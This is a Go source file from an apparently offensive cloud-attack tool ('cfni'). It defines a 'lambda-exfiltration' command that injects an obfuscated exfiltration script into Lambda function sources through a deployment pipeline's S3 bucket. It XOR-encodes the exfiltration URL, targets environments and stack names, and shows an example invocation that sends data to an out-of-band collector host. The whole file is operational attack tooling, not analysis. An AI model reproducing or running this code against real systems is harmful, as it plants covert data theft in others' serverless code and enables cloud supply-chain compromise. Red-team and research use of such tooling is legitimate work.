package cmd

import (
	"math/rand"
	"strings"

	"github.com/hupe1980/cfni/pkg/cfni"
	"github.com/spf13/cobra"
)

type lambdaExfiltrationOptions struct {
	attackOptions
	url string
}

func newLambdaExfiltrationCmd(globalOpts *globalOptions) *cobra.Command {
	opts := &lambdaExfiltrationOptions{}
	cmd := &cobra.Command{
		Use:           "lambda-exfiltration",
		Short:         "Injects an exfiltration script into lambda sources (nodejs or python)",
		Example:       "cfni lambda-exfiltration --attacker-profile ap --bucket-profile bp --bucket pipeline-bucket --s3-access-key-id AKIAXXX --s3-secret-access-key Ey123XXX --url https://xxxyem3.oastify.com",
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			c, err := newCFNI(globalOpts)
			if err != nil {
				return err
			}

			s3AccessKey := &cfni.S3AccessKey{
				AccessKeyID:     opts.accessKeyID,
				SecretAccessKey: opts.secretAccessKey,
				SessionToken:    opts.sessionToken,
			}

			handler, err := c.CreateLambdaExfiltrationHandler(&cfni.CreateLambdaExfiltrationOptions{
				URL:         opts.url,
				XORKey:      randomKey(len(opts.url)),
				S3AccessKey: s3AccessKey,
				Filter: &cfni.Filter{
					Environments: opts.environments,
					StackNames:   opts.stackNames,
				},
			})
			if err != nil {
				return err
			}

			return c.CreateInfrastructure(opts.bucket, handler, "", !s3AccessKey.IsValid())
		},
	}

	addAttackCommands(cmd, &opts.attackOptions)

	cmd.Flags().StringVarP(&opts.url, "url", "u", "", "exfiltration url (required)")

	_ = cmd.MarkFlagRequired("url")

	return cmd
}

func randomKey(length int) string {
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" + "0123456789")

	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))]) //nolint gosec
	}

	return b.String()
}
